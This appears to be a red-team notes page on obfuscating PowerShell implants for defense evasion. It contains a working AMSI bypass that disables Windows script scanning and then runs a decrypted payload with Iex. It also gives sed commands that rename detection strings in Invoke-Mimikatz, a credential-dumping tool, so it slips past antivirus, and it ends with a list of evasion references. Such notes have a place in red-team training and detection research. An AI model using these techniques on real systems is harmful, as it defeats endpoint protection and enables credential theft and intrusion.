# PowerShell

Search Tag(s): #helpers #malware-development #defense-evasion

TODO: Provide more ways to obfuscate powershell script/implant.

## 01 - Powershell Cmdlets

### Abstract Syntax Tree (AST)

```
PS /home/userware> Get-Command -name ("{1}{2}{0}{3}" -f "-Proces", "G", "et", "s")

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Get-Process                                        7.0.0.0    Microsoft.PowerShell.Management
```

### Encrypted Strings

```
$secureString = ConvertTo-SecureString -String '<payload>' -AsPlainText -force
$encoded = ConvertFrom-SecureString -k (0..15) $secureString > output.txt

$encoded = <encoded payload>
$Ref = [REF].Assembly.GetType('System.Management.Automation.AmsiUtils’);
$Ref.GetField(‘AmsiInitFailed','NonPublic,Static’).SetValue($null, $true);
$credential = [System.Management.Automation.PSCredential]::new("tim",(ConvertTo-SecureString -k (0..15)
$encoded))
Iex $credential.GetNetworkCredential().Password
```

## 02 - Modify Powershell file

### 2.1 - Remove Spaces, Comments and Aliases

```
$ sed -i -e "/<#/,/#>/c\\" \
-e "s/^[[:space:]]*#.*$//g"
-e "/Set-Alias/d" implant.ps1
```

### 2.2 - Modify Variables and Concatenate Strings

Using `Invoke-Mimikatz` as an example.

```
$ sed -i "s/-Name VirtualProtect/<new_string>/g" \
-e "s/-Name WriteProcessMemory/<new_string>/g" \
-e "s/::logonPass/<new_string>/g" \
-e "s/DumpCreds/<new_variable>/g" \
-e "s/DumpCerts/<new_variable>/g" \
-e "s/CustomCommand/<new_variable>/g" \
-e "s/TypeBuilder/<new_variable>/g" \
-e "s/Win32Types/<new_variable>/g" \
-e "s/Win32Functions/<new_variable>/g" \
-e "s/shellcode/<new_variable>/g" \
-e "s/PEBytes64/<new_variable>/g" \
-e "s/PEBytes32/<new_variable>/g" \
-e "s/ArgumentPtr/<new_variable>/g" \
-e "s/CallDllMainSC1/<new_variable>/g" \
-e "s/'TVq/'TV'+'q/g" Invoke-Mimikatz.ps1
```

---
## References

- [Daniel Bohannon: PowerShell Execution Argument Obfuscation (& How It Can Make Detection Easier!)](https://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier)

- [huebicode: Powershell Obfuscation](https://huebicode.com/blog/powershell-obfuscation.html)

- [t3l3machus: Powershell Obfuscation Bible](https://github.com/t3l3machus/PowerShell-Obfuscation-Bible)

- [gh0x0st: Layer 0 Obfuscation](https://github.com/gh0x0st/Invoke-PSObfuscation/blob/main/layer-0-obfuscation.md)

- [huebicode: Powershell Obfuscation](https://huebicode.com/blog/powershell-obfuscation.html)

- [r00t-3xp10it: Simple Obfuscation](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md)

- [Bordergate: Obfuscating Command Line Arguments](https://www.bordergate.co.uk/obfuscating-command-line-arguments/)

- [onlyf8: Powershell and Obfuscation](https://onlyf8.com/powershell-obfuscationEN)

- [klezvirus: Chameleon Born From a Chimera](https://klezvirus.github.io/RedTeaming/AV_Evasion/BornFromAChimera/)

- [Jorge Lajara: Powershell AV Evasion. Running Mimikatz with PowerLine](https://jlajara.gitlab.io/Mimikatz-AV-Evasion)

- [geoda: Running an Obfuscated version of Mimikatz in Memory to bypass AntiVirus and other host based controls](https://blog.geoda-security.com/2018/05/running-obfuscated-version-of-mimikatz.html)

- [Black Hills Information Security: How to Bypass Anti-Virus to Run Mimikatz](https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/)

- [Digital Whisper: Fileless Attacks Part 2](https://www.digitalwhisper.co.il/files/Zines/0x8E/DW142-1-FilelessAttacks_Part2.pdf)

- [CTFIoT: Bypassing Windows Defender](https://www.ctfiot.com/112423.html)

- [Dennis Chow: Fun with PowerShell Payload Execution and Evasion](https://medium.com/swlh/fun-with-powershell-payload-execution-and-evasion-f5051fd149b2)

### Debugging AMSI Function

- [Winslow Blog: Bypass AMSI On Windows 11](https://winslow1984.com/books/red-team/page/bypass-amsi-on-windows-11)